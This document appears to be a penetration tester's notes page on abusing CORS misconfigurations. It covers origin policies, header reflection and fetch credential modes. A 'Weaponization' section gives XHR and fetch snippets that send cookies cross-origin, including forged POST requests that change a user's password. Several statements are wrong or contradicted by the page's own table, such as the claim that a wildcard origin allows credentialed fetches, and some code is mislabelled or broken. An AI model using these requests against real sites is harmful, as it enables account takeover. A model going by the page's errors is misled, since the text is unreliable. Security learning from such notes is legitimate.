# CORS XSS

There are 2 things you need to take in account for abusing CORS. Policies and Headers.

`Cross-Origin-Resource-Policy: same-site | same-origin | cross-origin`

## Policies

[Cross-Origin Resource Sharing (CORS) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

CORS has multiple policies, specifically 3. Same-site, Same-Origin, and Cross-Origin.

### **Same-Site Policy**

Websites that have the same scheme and the same eTLD+1 are considered 
"same-site". Websites that have a different scheme or a different eTLD+1
 are "cross-site".

| Origin A | Origin B | Explanation of whether Origin A and B are "same-site" or "cross-site" |
| --- | --- | --- |
| https://www.example.com:443 | https://www.evil.com:443 | cross-site: different domains |
| https://www.example.com:443 | https://login.example.com:443 | same-site: different subdomains don't matter |
| https://www.example.com:443 | http://www.example.com:443 | cross-site: different schemes |
| https://www.example.com:443 | https://www.example.com:80 | same-site: different ports don't matter |
| https://www.example.com:443 | https://www.example.com:443 | same-site: exact match |
| https://www.example.com:443 | https://www.example.com | same-site: ports don't matter |

### Same Origin Policy

| URL accessed | Access permitted? |
| --- | --- |
| http://normal-website.com/example/ | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/ | Yes: same scheme, domain, and port |
| https://normal-website.com/example/ | No: different scheme and port |
| http://en.normal-website.com/example/ | No: different domain |
| http://www.normal-website.com/example/ | No: different domain |
| http://normal-website.com:8080/example/ | No: different port* |

### Cross-Origin Policy

The target website will always reply with the following header.

`Access-Control-Allow-Origin: https://foo.example`

This will dictate what sites can fetch queries on the target site.

`Access-Control-Allow-Origin: *`

Sometimes you will find `*` which allows any site to fetch using cookies.

### Null Origin Policy

Some applications that support access from multiple origins do so by 
using a whitelist of allowed origins. When a CORS request is received, 
the supplied origin is compared to the whitelist. If the origin appears 
on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

The application checks the supplied origin against its list of 
allowed origins and, if it is on the list, reflects the origin as 
follows:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Developers sometimes use this for development of the application, locally.

### Weaponization

There are 2 ways to abuse CORs Misconfigurations, `Fetch` and `XHR`

### XHR

As shown below, you can both POST and GET.

```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log(xhr.responseText);
    }
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```

### Fetch

[Fetch Standard](https://fetch.spec.whatwg.org/)

**Methods**

`post`

`get`

**Credentials**

`omit`

`include`

See Table below for when you can / cannot use `omit` / `include`

**Mode**

Sec-Fetch-Mode: `cors`

Sec-Fetch-Mode: `navigate`

Sec-Fetch-Mode: `no-cors`

Sec-Fetch-Mode: `same-origin`

Sec-Fetch-Mode: `websocket`

```php
fetch("a.com",
mode: "cors", .....
```

| Request’s credentials mode | https://fetch.spec.whatwg.org/#http-access-control-allow-origin | https://fetch.spec.whatwg.org/#http-access-control-allow-credentials | Shared? | Notes |
| --- | --- | --- | --- | --- |
| "omit" | * | Omitted | ✅ | — |
| "omit" | * | true | ✅ | If credentials mode is not "include", then
  `https://fetch.spec.whatwg.org/#http-access-control-allow-credentials` is ignored. |
| "omit" | https://rabbit.invalid/ | Omitted | ❌ | A https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin origin has no trailing slash. |
| "omit" | https://rabbit.invalid | Omitted | ✅ | — |
| "include" | * | true | ❌ | If credentials mode is "include", then
  `https://fetch.spec.whatwg.org/#http-access-control-allow-origin` cannot be
  `*`. |
| "include" | https://rabbit.invalid | true | ✅ | — |
| "include" | https://rabbit.invalid | True | ❌ | `true` is (byte) case-sensitive. |

Fetch cfg.js

```php
fetch("http://concord:8001/cfg.js")
    .then(function (response) {
        return response.text();
    })
    .then(function (text) {
        console.log(text);
    })
```

Fetch [example.com](http://example.com/)

```php
fetch("http://example.com")
   .then(function (response) {
       return response.text();
   })
   .then(function (text) {
       console.log(text);
   })
```

Fetch [example.com](http://example.com/) - POST - Standard

```php
fetch("http://example.com",
   {
       method: 'post',
       headers: {
           "Content-type": "application/x-www-form-urlencoded;"
       }
   })
```

Fetch [example.com](http://example.com/) - POST - JSON

```php
fetch("http://example.com",
   {
       method: 'post',
       headers: {
           "Content-type": "application/json;"
       },
			body: {"key":"data"}
   })
```

Fetch CORS-test - POST - JSON

```php
fetch("http://cors-test.appspot.com/test",
   {
       method: 'post',
       headers: {
           "Content-type": "application/json;"
       }
   })
```

fetch examples using modes

```php

  fetch('localhost/changepassword', {
	  method: 'POST',
	  mode: 'no-cors',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
	  body: "password=aaa"
  });

fetch('localhost/changepassword', {
    method: 'POST',
		credentials: 'include',
		mode: 'cors',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "password=aaa"
})
```